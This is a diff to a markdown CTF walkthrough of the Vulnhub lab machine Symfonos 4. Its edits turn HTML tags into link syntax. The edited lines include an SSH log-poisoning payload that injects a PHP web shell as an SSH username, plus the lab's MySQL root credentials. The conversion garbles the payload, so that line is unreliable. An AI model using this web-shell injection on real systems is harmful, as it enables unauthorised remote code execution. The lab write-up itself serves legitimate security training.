@@ -12,7 +12,7 @@ Today, We are going to pwn Symfonos 4 by Zayotic from Vulnhub
 ```
 OSCP-like Intermediate real life based machine designed to teach people the importance of trying harder.
 ```
-Download Link : <https://www.vulnhub.com/entry/symfonos-4,347/>
+Download Link : [https://www.vulnhub.com/entry/symfonos-4,347/](https://www.vulnhub.com/entry/symfonos-4,347/)
 
 Lets Begin with our Initial Scan
 
@@ -77,7 +77,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/symfonos4/2.png)
 
-Downloaded all log files to my machine.<br/>
+Downloaded all log files to my machine.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/symfonos4/3.png)
 
 ``hades.log``
@@ -122,7 +122,7 @@ When seeing those Log files it shows ``OpenSSH`` so we can do ``SSH Log Poisonin
 Reference :
 >https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/
 
-```ssh '<?php system($_GET['c']); ?>'@192.168.1.136```
+```ssh '[?php system($_GET['c']); ?](?php system($_GET['c']); ?)'@192.168.1.136```
 
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/symfonos4/10.png)
 
@@ -136,7 +136,7 @@ When checking ``/var/www/html/atlantis.php`` found ``mysql`` credentials.
 
 ``root : yVzyRGw3cG2Uyt2r``
 
-I logged with those and got admin hash.<br/>
+I logged with those and got admin hash.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/symfonos4/13.png)
 
 MySql Commands 
